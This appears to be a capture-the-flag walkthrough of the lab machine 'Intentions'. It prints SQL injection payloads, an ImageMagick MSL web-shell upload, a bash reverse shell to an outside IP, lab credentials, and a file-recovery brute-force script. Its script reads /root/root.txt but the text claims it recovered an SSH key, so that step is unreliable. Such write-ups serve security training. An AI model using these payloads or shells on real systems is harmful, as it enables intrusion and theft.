## Reconnaissance
```bash
nmap 10.129.229.27 -p- -A -T5 -Pn
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
```

## SQL Injection Exploitation
After registration and authentication, the "Favorite Genres" parameter was found vulnerable to **second-order SQL injection**:
- Payload modified the `genres` parameter to inject UNION queries
- **Reflection point**: `/api/v1/gallery/user/feed` endpoint displayed query results 

**Table enumeration:**
```
')/**/UNION/**/SELECT/**/1,2,table_name,4,5/**/from/**/information_schema.tables#
```
Relevant tables: `users`, `personal_access_tokens`, `gallery_images` 

**Credential extraction:**
```
{"genres":"')/**/UNION/**/SELECT/**/1,CONCAT(name,0x3a,email,0x3a,password),3,4,5/**/from/**/users#"}
```
**Credentials found:**
- `steve@intentions.htb:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa`
- `greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m`

## Admin Access & RCE
### v2 API Authentication Bypass
Discovered API v2 endpoint in `/js/admin.js` :
```javascript
// Admin.js hint
"Hey team, I've deployed the v2 API to production..."
```
**Authentication bypass:**
- Authenticated to `/api/v2/auth/login` using Steve's **bcrypt hash** instead of password
- Obtained admin token and accessed `/admin` panel 

### ImageMagick Exploit
Admin panel had image modification functionality vulnerable to **Arbitrary Object Instantiation** :
```http
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd HTTP/1.1
Host: 10.129.229.27
... [admin headers] ...

----------------------------abcd
Content-Disposition: form-data; name="file"; filename="exploit.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/shell.php" />
</image>
----------------------------abcd
```

**Reverse shell trigger:**
```bash
curl http://10.129.229.27/storage/shell.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.42/4444 0>%261"'
```
Obtained reverse shell as `www-data` user 

## Privilege Escalation (User)
### Git Analysis
Compressed and downloaded `.git` directory:
```bash
tar -cvf /tmp/git.tar .git
mv /tmp/git.tar /var/www/html/intentions/public/
```
Accessed via `http://intentions.htb/git.tar` 

**Found credentials in commit history:**
```diff
commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         }
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
```
**Credentials:** `greg:Gr3g1sTh3B3stDev3l0per!1998!` 

**User flag:**
```
7b0b********************************
```

## Privilege Escalation (Root)
### Scanner Binary Analysis
Greg belonged to `scanner` group with access to custom binary:
```bash
$ ls -l /opt/scanner/scanner
-rwxr-xr-- 1 root scanner 16976 Jan 26  2023 /opt/scanner/scanner
```

**Binary functionality:**
```bash
$ /opt/scanner/scanner -h
Usage: scanner -c <config-file> -l <line> -p -s <speed>
```
The `-c` flag could read arbitrary files but with **output hashing** 

### Hash Manipulation
Created Python script to brute-force file reading:
```python
import hashlib
import os
import string

charset = string.printable
result = ""

def get_hash(i):
    return os.popen(f"/opt/scanner/scanner -c /root/root.txt -l {i} -p -s 1111").read().split(" ")[-1].strip()

def find_char(pos, known_hash):
    for char in charset:
        test_str = result + char
        if hashlib.md5(test_str.encode()).hexdigest() == known_hash:
            return char
    return None

for i in range(1, 50):
    line_hash = get_hash(i)
    char_found = find_char(i, line_hash)
    if char_found:
        result += char_found
    else:
        break

print(f"Recovered content: {result}")
```
**Recovered root SSH key** from `/root/.ssh/id_rsa` 

**Root flag:**
```
3e2d********************************
```

## Conclusion
**Attack chain:**
1. Second-order SQLi → credential extraction
2. v2 API hash authentication → admin access
3. ImageMagick arbitrary object instantiation → RCE
4. Git analysis → user credentials
5. Custom binary hash manipulation → root access
